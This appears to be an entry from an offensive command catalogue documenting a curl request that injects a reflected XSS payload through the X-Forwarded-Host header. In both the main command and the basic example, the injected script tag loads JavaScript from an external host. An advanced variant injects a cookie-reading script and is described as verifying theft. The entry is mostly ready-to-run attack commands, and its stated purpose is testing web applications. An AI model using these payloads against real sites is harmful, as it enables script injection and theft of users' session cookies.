---
id: cmd-uuid-1
data: >-
  curl -H "X-Forwarded-Host: foo\"><script src=//dtf.pw/2.js></script><x=\".com"
  https://█████/████████/
tags:
  - xss
  - http
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:38.208Z'
verified: false
validated: true
submitted: true
---
# curl-send-xss-payload

## Command

```bash
curl -H "X-Forwarded-Host: foo\"><script src=//dtf.pw/2.js></script><x=\".com" https://█████/████████/
```

## Description

This command uses curl to send an HTTP GET request to a target endpoint with a crafted X-Forwarded-Host header containing a reflected XSS payload. It exploits server-side reflection of the header to inject JavaScript, useful for testing XSS vulnerabilities in web applications that mishandle proxy headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Specifies the custom header (X-Forwarded-Host with payload) | Yes |
| `https://█████/████████/` | Target URL endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Forwarded-Host: foo\"><script src=//dtf.pw/2.js></script><x=\".com" https://█████/████████/
```

### Advanced Usage

```bash
curl -H "X-Forwarded-Host: foo\"><script>alert(document.cookie)</script><x=\".com" -v https://█████/████████/ --cookie "test=123"
```

> Adds verbose output (-v) and a test cookie to verify theft.

## Expected Output

HTTP response body containing the reflected header value, e.g., HTML with embedded <script src=//dtf.pw/2.js></script>. When viewed in a browser, this triggers script execution, potentially alerting cookie data like '██████████_██████████='.

## Related

- [[Related Procedure: Inject-Malicious-Payload-into-X-Forwarded-Host-Header]]
